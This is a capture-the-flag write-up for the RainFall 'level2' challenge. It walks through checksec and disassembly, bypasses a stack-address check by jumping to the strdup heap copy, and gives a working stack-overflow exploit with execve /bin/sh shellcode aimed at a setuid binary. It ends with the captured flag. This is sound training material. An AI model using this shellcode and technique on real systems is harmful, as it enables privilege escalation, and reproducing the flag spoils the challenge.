# Level2

## 1. Initial Analysis
### 1.1 File Metadata & Permissions
```bash
level2@RainFall:~$ file ./level2 
./level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0b5bb6cdcf572505f066c42f7be2fde7c53dc8bc, not stripped
```
```bash
level2@RainFall:~$ ls -l 
total 8
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
```
- **SetUID (s)**: The binary has the `s` bit on the owner's permissions, meaning it executes with the privileges of the file owner (`level3`) rather than the user running it (`level2`).
- **SetGID (s)**: Similarly, the group ID is set, allowing the process to inherit the `users` group permissions.
- **The Hint**: The goal is to exploit the binary to hijack its execution flow; because of these bits, any shell spawned will inherit `level3` privileges, allowing access to the next level's password.

### 1.2 Binary Security Properties (checksec)
```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
```
- RELRO (No RELRO): The Global Offset Table (GOT) is not read-only. This means we can potentially overwrite function pointers to redirect the program's execution.

- Stack Canary (No canary found): There is no stack protector (cookie). We can overwrite the return address on the stack without the program detecting the corruption and terminating.

- NX (NX disabled): The stack is executable. This is a critical vulnerability that allows us to execute custom shellcode if we can place it in a memory buffer and jump to it.

- PIE (No PIE): Position Independent Executable is disabled. The binary's code and data sections are loaded at the same fixed memory addresses every time, making our calculated addresses reliable.

- RPATH/RUNPATH: No hardcoded library search paths are defined, ensuring the binary uses standard system libraries.

## 2. Static Analysis with Objdump
```bash
level2@RainFall:~$ objdump -d ./level2
```
```nasm
080484d4 <p>:
 80484d4:	55                   	push   %ebp
 80484d5:	89 e5                	mov    %esp,%ebp
 80484d7:	83 ec 68             	sub    $0x68,%esp
 80484da:	a1 60 98 04 08       	mov    0x8049860,%eax
 80484df:	89 04 24             	mov    %eax,(%esp)
 80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt>
 80484e7:	8d 45 b4             	lea    -0x4c(%ebp),%eax
 80484ea:	89 04 24             	mov    %eax,(%esp)
 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
 80484f2:	8b 45 04             	mov    0x4(%ebp),%eax
 80484f5:	89 45 f4             	mov    %eax,-0xc(%ebp)
 80484f8:	8b 45 f4             	mov    -0xc(%ebp),%eax
 80484fb:	25 00 00 00 b0       	and    $0xb0000000,%eax
 8048500:	3d 00 00 00 b0       	cmp    $0xb0000000,%eax
 8048505:	75 20                	jne    8048527 <p+0x53>
 8048507:	b8 20 86 04 08       	mov    $0x8048620,%eax
 804850c:	8b 55 f4             	mov    -0xc(%ebp),%edx
 804850f:	89 54 24 04          	mov    %edx,0x4(%esp)
 8048513:	89 04 24             	mov    %eax,(%esp)
 8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>
 804851b:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt>
 8048527:	8d 45 b4             	lea    -0x4c(%ebp),%eax
 804852a:	89 04 24             	mov    %eax,(%esp)
 804852d:	e8 be fe ff ff       	call   80483f0 <puts@plt>
 8048532:	8d 45 b4             	lea    -0x4c(%ebp),%eax
 8048535:	89 04 24             	mov    %eax,(%esp)
 8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
 804853d:	c9                   	leave  
 804853e:	c3                   	ret    

0804853f <main>:
 804853f:	55                   	push   %ebp
 8048540:	89 e5                	mov    %esp,%ebp
 8048542:	83 e4 f0             	and    $0xfffffff0,%esp
 8048545:	e8 8a ff ff ff       	call   80484d4 <p>
 804854a:	c9                   	leave  
 804854b:	c3                   	ret    
 804854c:	90                   	nop
 804854d:	90                   	nop
 804854e:	90                   	nop
 804854f:	90                   	nop
```
### 2.1 The Stack Address Security Check
I analyzed a specific security mechanism implemented in the <p> function to prevent standard stack-based exploitation:
```nasm
 80484fb:   25 00 00 00 b0          and    $0xb0000000,%eax
 8048500:   3d 00 00 00 b0          cmp    $0xb0000000,%eax
 8048505:   75 20                   jne    8048527 <p+0x53>
 ```
 The program retrieves the return address from the stack and performs a bitwise AND operation with 0xb0000000.
 On this 32-bit Linux system, stack addresses typically start with 0xbf.... The check ensures that if the return address is located on the stack (starting with 0xb), the program will print an error message and exit immediately via _exit@plt



### 2.2 Identifying Vulnerabilities

By analysing the p function, i have identified two critical points:
- Vulnerable Input: At 0x080484ed, the program calls gets@plt. This function is inherently dangerous as it reads input into a buffer without checking the size, allowing us to overwrite the stack.

- The Buffer: The instruction lea -0x4c(%ebp),%eax at 0x080484e7 indicates that the input buffer starts 76 bytes (0x4c in decimal) before the Saved EBP.

beginning of heap: 0x804a000
beginning of stack: 0xbffdf000

### 2.3 Strategic Conclusion
The security check at 0x080484fb effectively blacklists the stack ($0xbf...$) as a return destination. However:
- The call to strdup at 0x08048538 copies our buffer into the Heap.
- Heap addresses (starting with $0x08...$) pass the check: $(0x0804a000 \& 0xb0000000) \neq 0xb0000000$.
- By placing shellcode at the start of our buffer and overwriting the EIP with the heap address of that copy, we can execute arbitrary code.

## 3. Dynamic Analysis & Strategy

### 3.1 Offset Calculation

```bash
# Start GDB with the binary
level2@RainFall:~$ gdb -q ./level2

# Generate a pattern and run the program
(gdb) run <<< $(python -c "print 'A'*80 + 'BBBB'")

# Observe the crash
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? () # 0x42424242 is 'BBBB', confirming the 80-byte offset

- I used GDB to determine the exact distance between the start of the buffer and the Saved EIP.
- The buffer starts at `-0x4c(%ebp)`, which is 76 bytes.
- Adding the 4 bytes of the Saved EBP, the total offset required to overwrite the return pointer is **80 bytes**.

### 3.2 Memory Mapping and Bypass Strategy
- **Heap Mapping**: I verified that the Heap starts at `0x0804a000`.
- **Stack Mapping**: I verified that the Stack starts at `0xbffdf000`.
- **The strdup() Advantage**: At address `0x08048538`, the program calls `strdup()`. This function allocates memory on the Heap and copies our input there.
- **Bypassing the Check**: Since Heap addresses (starting with `0x08`) do not satisfy the `(addr & 0xb0000000) == 0xb0000000` condition, the security check will allow the program to jump to the Heap version of our buffer.


```bash
(gdb) info proc mapping
process 3253
Mapped address spaces:
 0x804a000  0x806b000    0x21000        0x0 [heap]
 0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

---

## 4. Exploitation

### 4.1 Payload Components
- **Shellcode**: A 25-byte standard x86 shellcode designed to execute `/bin/sh`.
- **Padding**: 55 bytes of filler characters (calculated as `80 bytes total offset - 25 bytes shellcode`).
- **Target Address**: `0x0804a008` (The specific address on the Heap where the shellcode resides after `strdup()`).

### 4.2 Final Exploit Command
- I used a Python print statement to construct the raw bytes and piped it into the binary.
- The `cat` command is appended to maintain an open session with the spawned shell.
```bash
(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "A"*55 + "\x08\xa0\x04\x08"';cat) | ./level2 
```
## flag
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02